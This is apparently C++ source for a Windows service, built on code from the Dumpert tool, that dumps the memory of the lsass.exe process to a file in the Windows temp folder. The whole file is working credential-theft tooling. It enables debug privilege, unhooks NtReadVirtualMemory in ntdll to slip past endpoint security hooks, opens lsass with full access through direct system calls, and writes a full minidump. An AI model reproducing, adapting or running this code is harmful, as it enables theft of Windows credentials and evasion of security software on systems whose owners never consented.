#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <Windows.h>
#include <tchar.h>
#include <cstdio>
#include <string>
#include "Dumpert.h"
#include <DbgHelp.h>

#pragma comment (lib, "Dbghelp.lib")

SERVICE_STATUS g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
VOID WINAPI ServiceCtrlHandler(DWORD);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);

#define SERVICE_NAME _T("Service")

// Using the code of Dumpert for the memory dumping!

BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo) {
	BYTE AssemblyBytes[] = { 0x4C, 0x8B, 0xD1, 0xB8, 0xFF };

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
	} else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
	} else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
	} else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
	} else {
		return FALSE;
	}

	LPVOID lpProcAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), pWinVerInfo->lpApiCall);

	printf("	[+] %s function pointer at: 0x%p\n", pWinVerInfo->lpApiCall, lpProcAddress);
	printf("	[+] %s System call nr is: 0x%x\n", pWinVerInfo->lpApiCall, AssemblyBytes[4]);
	printf("	[+] Unhooking %s.\n", pWinVerInfo->lpApiCall);

	LPVOID lpBaseAddress = lpProcAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = 10;
	NTSTATUS status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
		return FALSE;
	}

	status = ZwWriteVirtualMemory(GetCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
	if (status != STATUS_SUCCESS) {
		wprintf(L"	[!] ZwWriteVirtualMemory failed.\n");
		return FALSE;
	}

	status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
		return FALSE;
	}

	return TRUE;
}

BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo) {
	pWinVerInfo->hTargetPID = NULL;

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation10;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
		NtFreeVirtualMemory = &NtFreeVirtualMemory10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation7SP1;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory7SP1;
		NtFreeVirtualMemory = &NtFreeVirtualMemory7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation80;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory80;
		NtFreeVirtualMemory = &NtFreeVirtualMemory80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation81;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
		NtFreeVirtualMemory = &NtFreeVirtualMemory81;
	}
	else {
		return FALSE;
	}

	ULONG uReturnLength = 0;
	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, 0, 0, &uReturnLength);
	if (!status == 0xc0000004)
		return FALSE;

	LPVOID pBuffer = NULL;
	SIZE_T uSize = uReturnLength;
	status = NtAllocateVirtualMemory(GetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
	if (status != 0)
		return FALSE;

	status = ZwQuerySystemInformation(SystemProcessInformation, pBuffer, uReturnLength, &uReturnLength);
	if (status != 0)
		return FALSE;

	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEqualUnicodeString");
	if (RtlEqualUnicodeString == NULL)
		return FALSE;

	PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES)pBuffer;
	do {
		if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &pWinVerInfo->ProcName, TRUE)) {
			pWinVerInfo->hTargetPID = pProcInfo->ProcessId;
			break;
		}
		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);

	} while (pProcInfo);

	status = NtFreeVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);

	if (pWinVerInfo->hTargetPID == NULL)
		return FALSE;

	return TRUE;
}

BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}

	if (hToken)
		CloseHandle(hToken);

	return fRet;
}

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPWSTR lpwPriv = (LPWSTR) L"SeDebugPrivilege";
	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);

	return TRUE;
}

constexpr DWORD DUMP_STATUS_SUCCESS = 0;
constexpr DWORD DUMP_STATUS_NOT_64_BIT = 1;
constexpr DWORD DUMP_STATUS_MISSING_ELEVATED_PRIVILEGES = 2;
constexpr DWORD DUMP_STATUS_WINDOWS_VERSION_UNSUPPORTED = 3;
constexpr DWORD DUMP_STATUS_PROCESS_ENUMERATION_FAILED = 4;
constexpr DWORD DUMP_STATUS_UNHOOKING_FAILED = 5;
constexpr DWORD DUMP_STATUS_FAILED_TO_OBTAIN_PROCESS_HANDLE = 6;
constexpr DWORD DUMP_STATUS_FAILED_TO_CREATE_FILE = 7;
constexpr DWORD DUMP_STATUS_DUMP_CALL_FAILED = 8;

DWORD dump() {
	if (sizeof(LPVOID) != 8)
          return DUMP_STATUS_NOT_64_BIT;

	if (!IsElevated())
		return DUMP_STATUS_MISSING_ELEVATED_PRIVILEGES;

	SetDebugPrivilege();

	PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO) calloc(1, sizeof(WIN_VER_INFO));

	// Set OS version/architecture-specific values.

	OSVERSIONINFOEXW osInfo;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	_RtlGetVersion RtlGetVersion = (_RtlGetVersion) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
	if (RtlGetVersion == NULL)
		return FALSE;

	RtlGetVersion(&osInfo);
	swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
	pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;

	// Create os/build-specific syscall function pointers.

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		ZwOpenProcess = &ZwOpenProcess10;
		NtCreateFile = &NtCreateFile10;
		ZwClose = &ZwClose10;
		pWinVerInfo->SystemCall = 0x3F;
	} else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
		ZwOpenProcess = &ZwOpenProcess7SP1;
		NtCreateFile = &NtCreateFile7SP1;
		ZwClose = &ZwClose7SP1;
		pWinVerInfo->SystemCall = 0x3C;
	} else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		ZwOpenProcess = &ZwOpenProcess80;
		NtCreateFile = &NtCreateFile80;
		ZwClose = &ZwClose80;
		pWinVerInfo->SystemCall = 0x3D;
	} else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		ZwOpenProcess = &ZwOpenProcess81;
		NtCreateFile = &NtCreateFile81;
		ZwClose = &ZwClose81;
		pWinVerInfo->SystemCall = 0x3E;
	} else {
          return DUMP_STATUS_WINDOWS_VERSION_UNSUPPORTED;
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL)
		return FALSE;

	// Obtain the PID of the lsass.exe process.

	RtlInitUnicodeString(&pWinVerInfo->ProcName, L"lsass.exe");
    if (!GetPID(pWinVerInfo))
		return DUMP_STATUS_PROCESS_ENUMERATION_FAILED;

	pWinVerInfo->lpApiCall = "NtReadVirtualMemory";
	if (!Unhook_NativeAPI(pWinVerInfo))
		return DUMP_STATUS_UNHOOKING_FAILED;

	// Obtain a handle to the process.

	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID uPid = { 0 };

	uPid.UniqueProcess = pWinVerInfo->hTargetPID;
	uPid.UniqueThread = (HANDLE)0;

	ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
    if (hProcess == NULL)
        return DUMP_STATUS_FAILED_TO_OBTAIN_PROCESS_HANDLE;

	// Dump memory to file.

	// Build the file path.
	WCHAR chDmpFile[MAX_PATH] = L"\\??\\";
	WCHAR chWinPath[MAX_PATH];
	GetWindowsDirectory(chWinPath, MAX_PATH);
	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\dump.dmp");
	UNICODE_STRING uFileName;
	RtlInitUnicodeString(&uFileName, chDmpFile);

	// Obtain a file handle.
	HANDLE hDmpFile = NULL;
	IO_STATUS_BLOCK IoStatusBlock;
	ZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
	OBJECT_ATTRIBUTES FileObjectAttributes;
	InitializeObjectAttributes(&FileObjectAttributes, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	NtCreateFile(
		&hDmpFile,
		FILE_GENERIC_WRITE,
		&FileObjectAttributes,
		&IoStatusBlock,
		0,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_WRITE,
		FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0
	);

	if (hDmpFile == INVALID_HANDLE_VALUE) {
		ZwClose(hProcess);
        return DUMP_STATUS_FAILED_TO_CREATE_FILE;
	}

	// Dump the memory.
	BOOL success = MiniDumpWriteDump(
		hProcess,
		GetProcessId(hProcess),
		hDmpFile,
		MiniDumpWithFullMemory,
		NULL,
		NULL,
		NULL
	);
	
	ZwClose(hDmpFile);
	ZwClose(hProcess);

	// TODO: Set some global status variable instead ? Does the calling function even retrieve this return value?
	return success ? ERROR_SUCCESS : DUMP_STATUS_DUMP_CALL_FAILED;
}

int _tmain(int argc, TCHAR* argv[]) {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {(LPWSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
        return GetLastError();

    return 0;
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    DWORD Status = E_FAIL;

    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    if (g_StatusHandle == NULL)
        return;

    // Tell the service controller we are starting
    ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
        return;

    /*
     * Perform tasks neccesary to start the service here
     */

     // Create stop event to wait on later.
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) {

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        g_ServiceStatus.dwCheckPoint = 1;

        if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
            return;

        return;
    }

    // Tell the service controller we are started
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
        return;

    // Wait until our worker thread exits effectively signaling that the service
    // needs to stop
    WaitForSingleObject(
		CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL),
		INFINITE
	);

    /*
     * Perform any cleanup tasks
     */

    CloseHandle(g_ServiceStopEvent);

    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
        return;

    return;
}

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {

    switch (CtrlCode) {
    case SERVICE_CONTROL_STOP:
        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCheckPoint = 4;

        if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
			break;

        SetEvent(g_ServiceStopEvent);

        break;
    default:
        break;
    }
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
	return dump();
}